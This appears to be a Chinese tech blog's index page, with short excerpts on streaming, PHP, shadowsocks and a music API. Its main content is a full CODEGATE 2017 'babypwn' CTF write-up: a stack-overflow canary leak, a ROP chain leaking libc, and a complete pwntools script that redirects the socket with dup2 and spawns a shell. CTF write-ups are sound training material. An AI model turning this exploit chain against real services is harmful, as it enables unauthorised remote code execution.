              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-14T22:32:03+08:00">
                2017-02-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <blockquote>
<p>项目需要，这里做一个简单的笔记梳理</p>
</blockquote>
<p>视频直播流程：采集端 &#x3D;&#x3D;&gt; 服务器端 &#x3D;&#x3D;&gt; 播放端</p>
<p><img src="https://github.com/palmerye/pictureBed/raw/master/livevideo/live.png" alt="image"></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/14/%E6%89%AB%E7%9B%B2%E7%AC%94%E8%AE%B0-H5%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/13/2017/02/reward/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/13/2017/02/reward/" itemprop="url">PHP生成随机红包算法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T00:07:06+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <blockquote>
<p>原文：<a target="_blank" rel="noopener" href="http://www.lcode.cc/2016/12/24/rand_ward.html">http://www.lcode.cc/2016/12/24/rand_ward.html</a></p>
</blockquote>
<p>前一阵公司业务有一个生成红包的需求，分为固定红包和随机红包两种，固定红包没什么好说的了，随机红包要求指定最小值，和最大值，必须至少有一个最大值，可以没有最小值，但任何红包不能小于最小值。</p>
<p><img src="//www.fanhaobai.com/2017/02/reward/p4GlWAFMrXts5zPMnA88Zsm_.png">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/13/2017/02/reward/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/11/CODEGATE-CTF-PREQUALS-2017-babypwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/11/CODEGATE-CTF-PREQUALS-2017-babypwn/" itemprop="url">[CODEGATE CTF 2017] babypwn 50</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-11T10:38:40+08:00">
                2017-02-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 500-&gt;50<br>Solver: Naetw @ BambooFox<br>這是這次比賽唯一解出的一題 Orz，最近 BambooFox 打比賽的人越來越少了，自己戰力也不足@@ 分析太慢經驗也太少…</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>32 bit ELF, Partial RELRO, 有 canary &amp; NX, 沒有 PIE</p>
<p>如同他的名字是一個蠻簡單的題目。有一個明顯的 stack overflow 漏洞，唯一比較麻煩的部分是 socket 的部分，因為這部分還沒學過，也就不多說。只是需要把 <code>fork</code> 出來的 file descriptor 接好。</p>
<p>程式主要功能在 <code>0x08048A71</code> function 裡，前面都在做 socket 的建置，如果要在 local 端測試的話，會先用 <code>ncat -vc ./babypwn -kl 127.0.0.1 4000</code> 架起來，看了一下 src，我們會先 <code>nc localhost 4000</code>，之後程式就會跑起來，並且把主要功能開在 port 8181，所以一旦 <code>nc localhost 4000</code> 過，之後測試就用 8181 這個 port 來測試就行了。</p>
<p>連上去之後，程式行為很簡單：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">===============================</span><br><span class="line">1. Echo</span><br><span class="line">2. Reverse Echo</span><br><span class="line">3. Exit</span><br><span class="line">===============================</span><br><span class="line">Select menu &gt; 1</span><br><span class="line">Input Your Message : AAAA</span><br><span class="line">AAAA</span><br><span class="line"></span><br><span class="line">===============================</span><br><span class="line">1. Echo</span><br><span class="line">2. Reverse Echo</span><br><span class="line">3. Exit</span><br><span class="line">===============================</span><br><span class="line">Select menu &gt;</span><br></pre></td></tr></table></figure>

<p>就是一個 echo server，第一直覺以為會是 format string，但是就是簡單的 echo 行為，不過在 echo 時，可以用 overflow 來 leak canary，後面才能利用 ROP 來做事。</p>
<p><strong>overflow</strong>：</p>
<p>開 ida pro 來看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char buf[40]; // [sp+24h] [bp-34h]@1</span><br><span class="line">...</span><br><span class="line">socket_recv(buf, 100) // socket_recv == 0x08048907</span><br></pre></td></tr></table></figure>

<p>這邊很明顯的 overflow，buf 的開頭距離 ebp 有 52，但是卻可以 input 100 bytes，因此這邊先算好跟 canary 的 offset，然後把 buf 塞成以下樣子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xff951f54:     0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0xff951f64:     0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0xff951f74:     0x41414141      0x41414141      0x4409b50a      0x00000000</span><br></pre></td></tr></table></figure>
<p>上面的 <code>0x4409b50a</code> 就是 canary，不過因為 canary 的 first byte 都會是 ‘\x00’，因此這邊用 ‘\x0a’ 也就是換行把它蓋著，才能接著把後面的值 dump 出來後，把 ‘\x0a’ 換成 ‘\x00’ &#x3D;&gt; <code>0x4409b500</code> 就是這個 binary 的 canary。</p>
<p>這邊有了 canary 後就可以繞過 stack guard 的檢查，疊 ROP 來控制 eip 了，不過這邊還是沒辦法開 shell，因為 socket 的 file descriptor 跟 stdin &amp; stdout 不同，所以我們會需要先用 <code>dup2</code> 來讓 stdin &amp; stdout 跟 socket 的 file descriptor 接起來，之後就能開 interactive shell on socket server。</p>
<p>但是要用到 <code>dup2</code> 會需要 libc base，這邊我們先做第一次的 ROP，把 GOT entry 上的 libc function address leak 出來，之後利用 <a target="_blank" rel="noopener" href="http://libcdb.com/">libc database</a> 來找出遠端 server 的 libc 版本，此外我們也要先把 file descriptor leak 出來。</p>
<p>因此這次 ROP 我們 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">socket_send = <span class="number">0x080488B1</span></span><br><span class="line">pop1 = <span class="number">0x08048589</span></span><br><span class="line">sigemptyset_got = <span class="number">0x0804B048</span></span><br><span class="line">echo_select = <span class="number">0x08048A71</span></span><br><span class="line">fd_address = <span class="number">0x0804B1B8</span></span><br><span class="line">rop1 = [socket_send, pop1, sigemptyset_got, </span><br><span class="line">        socket_send, echo_select, fd_address]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">40</span> +      <span class="comment"># padding to canary</span></span><br><span class="line">        p32(canary) +</span><br><span class="line">        <span class="string">&#x27;A&#x27;</span>*<span class="number">12</span> +        <span class="comment"># padding to return address</span></span><br><span class="line">        <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32, rop1))</span><br></pre></td></tr></table></figure>

<p>疊完之後，利用 choice 3 - exit 他會用 return 結束，就可以接到我們寫上去的 ROP gadgets 了。</p>
<p>這裡的 <code>socket_send</code> 用的是原本就寫好用來 echo input 的 function，<code>pop1</code> 則是利用 <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> 找到的一個 pop 一次後 ret 的 gadget，而 <code>echo_select</code> 則是上面提到的主要 function 的位址，因為 leak 玩東西之後我們要再做一次 ROP 來使用 <code>dup2</code> 以及開 shell。</p>
<p>這裡他會從 <code>sigemptyset_got</code> 開始 leak 很多 libc function，我拿前面四個到上面說的 libc database 查版本是可以查到的。</p>
<p>拿到 libc base 之後，直接在疊一次 ROP，這次 ROP 會用 <code>dup2</code> 把 stdin &amp; stdout 跟 socket 的 fd 接起來，之後馬上開 shell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pop2 = <span class="number">0x08048B84</span></span><br><span class="line">sh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;sh\x00&#x27;</span>))</span><br><span class="line">rop2 = [dup2, pop2, fd, <span class="number">1</span>,</span><br><span class="line">        dup2, pop2, fd, <span class="number">0</span>,</span><br><span class="line">        system, <span class="number">0xdeadbeef</span>, sh]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">40</span> +      <span class="comment"># padding to canary</span></span><br><span class="line">        p32(canary) +</span><br><span class="line">        <span class="string">&#x27;A&#x27;</span>*<span class="number">12</span> +        <span class="comment"># padding to return address</span></span><br><span class="line">        <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32, rop2))</span><br></pre></td></tr></table></figure>

<p>再次利用 choice 3 來 return 到 ROP gadgets 上。</p>
<p>Final Exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment"># pip install pwntools</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">8181</span></span><br><span class="line">reip = <span class="string">&#x27;110.10.212.130&#x27;</span></span><br><span class="line">report = <span class="number">8888</span></span><br><span class="line"></span><br><span class="line">r = remote(ip, port)</span><br><span class="line"><span class="comment">#r = remote(reip, report)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Default address &amp; libc setting</span></span><br><span class="line">echo_select = <span class="number">0x08048a71</span></span><br><span class="line">socket_send = <span class="number">0x080488b1</span></span><br><span class="line">sigemptyset_got = <span class="number">0x0804b048</span></span><br><span class="line">fd = <span class="number">0x0804b1b8</span></span><br><span class="line">pop1 = <span class="number">0x08048589</span></span><br><span class="line">pop2 = <span class="number">0x08048b84</span></span><br><span class="line">bss_buf = <span class="number">0x0804bfc0</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">payload</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak canary</span></span><br><span class="line">echo(<span class="string">&#x27;A&#x27;</span> * <span class="number">40</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">canary = r.recv(<span class="number">3</span>)</span><br><span class="line">canary = u32(<span class="string">&#x27;\x00&#x27;</span> + canary)</span><br><span class="line">log.info(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak libc function address and File Descripter</span></span><br><span class="line">rop1 = [socket_send, pop1, sigemptyset_got, socket_send, echo_select, fd]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">40</span> + p32(canary) +<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32, rop1))</span><br><span class="line">echo(payload + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>) </span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>) <span class="comment"># Use exit to ret to rop</span></span><br><span class="line">r.recv()</span><br><span class="line">sig = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">listen = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">atoi = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">r.recv()</span><br><span class="line">fd = <span class="built_in">ord</span>(r.recv(<span class="number">1</span>))</span><br><span class="line">log.info(<span class="string">&#x27;sigemptyset : &#x27;</span> + <span class="built_in">hex</span>(sig) + <span class="string">&#x27;\n&#x27;</span> + </span><br><span class="line">        <span class="string">&#x27;listen : &#x27;</span> + <span class="built_in">hex</span>(listen) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;atoi : &#x27;</span> + <span class="built_in">hex</span>(atoi) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;fd : &#x27;</span> + <span class="built_in">hex</span>(fd))</span><br><span class="line">base = atoi - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">dup2 = base + libc.symbols[<span class="string">&#x27;dup2&#x27;</span>]</span><br><span class="line">system = <span class="number">0x08048620</span></span><br><span class="line">read = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;base : &#x27;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">sh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Duplicate fd and stdout &amp; stdin(in order to use shell)</span></span><br><span class="line">rop2 = [dup2, pop2, fd, <span class="number">1</span>,</span><br><span class="line">        dup2, pop2, fd, <span class="number">0</span>,</span><br><span class="line">        system, <span class="number">0xdeadbeef</span>, sh]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">40</span> + p32(canary) + <span class="string">&#x27;A&#x27;</span>*<span class="number">12</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32, rop2))</span><br><span class="line">echo(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use exit to ret to rop2</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


<p>FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}</p>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>這次題目開了兩個 port，第一個 port 似乎太多人連…導致開 shell 不知道為啥開不起來，同樣的 payload 在第二個 port 十分順利＠＠</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/09/2017/why-do-shadowsocks-deprecate-ota/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/09/2017/why-do-shadowsocks-deprecate-ota/" itemprop="url">为何 shadowsocks 要弃用一次性验证 (OTA)</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-09T19:18:00+08:00">
                2017-02-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>前些天，shadowsocks 提出了 SIP004 草案，旨在使用 <code>AEAD 算法</code> 取代原先的不安全的 <code>流加密 + OTA</code>，并弃用了一次性验证 (OTA)。</p>
<p>新协议的提出对于 shadowsocks 是一个非常非常重大的改进，因此我写了这篇博文为看不懂洋文的<span title="pong">朋</span>友们科普一下「为什么 OTA 会被这么快被弃用」以及「为什么应该使用新协议」。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/09/2017/why-do-shadowsocks-deprecate-ota/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/08/netease-music-api/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/08/netease-music-api/" itemprop="url">网易云音乐新API简述</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-08T00:00:00+08:00">
                2017-02-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web/" itemprop="url" rel="index">
                    <span itemprop="name">Web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>新API采用了略微修改过的AES和RSA加密，主要用在登陆接口上，对新API进行简单的分析。</p>
<h2 id="Url"><a href="#Url" class="headerlink" title="Url"></a>Url</h2><p>估计会抓包的人都知道，Url中的api便成了weapi。比如手机登录：<br>原来是：<code>http://music.163.com/api/login/cellphone/</code><br>现在是：<code>http://music.163.com/weapi/login/cellphone/</code></p>
<h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><p>核心过程如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> aesRsaEncrypt = <span class="keyword">function</span> (<span class="params">text, pubKey, modulus, nonce</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> secKey = <span class="title function_">createSecretKey</span>(<span class="number">16</span>);  <span class="comment">// 随机生成16位加密密钥</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">	<span class="attr">params</span>:  <span class="title function_">aesEncrypt</span>(<span class="title function_">aesEncrypt</span>(text, nonce), secKey),</span><br><span class="line">	<span class="attr">encSecKey</span>: <span class="title function_">rsaEncrypt</span>(secKey, pubKey, modulus)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/08/netease-music-api/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/my-setup-for-this-blog">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/my-setup-for-this-blog" itemprop="url">SSL, HTTP/2, Service Worker, Offline Mode? This blog has all of them</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-07T07:30:00+08:00">
                2017-02-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          Some background on the hidden features of this blog. Static site, progressive images, AMP, HTTP/2, SSL...
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/my-setup-for-this-blog">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/07/Pandorabox-transparent-proxy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/07/Pandorabox-transparent-proxy/" itemprop="url">Pandorabox之透明代理</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-07T00:00:00+08:00">
                2017-02-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Openwrt/" itemprop="url" rel="index">
                    <span itemprop="name">Openwrt</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><img src="https://ol1kreips.qnssl.com/PandoraBox.png" alt="enter description here" title="PandoraBox.png"><br>先修改Lan接口，避免在无线中继的时候发生本地Lan接口与wwan接口发生冲突导致无法登陆路由器。</p>
<p><code>网络 -&gt; Lan -&gt; IPv4地址， 设置为 192.168.33.1</code>更改之后需要重新连接一下网络。</p>
<p>透明代理使用<code>shadowsocks-libev</code>和<code>ChinDNS</code>实现。使用ssh登陆路由器，安装所需软件。</p>
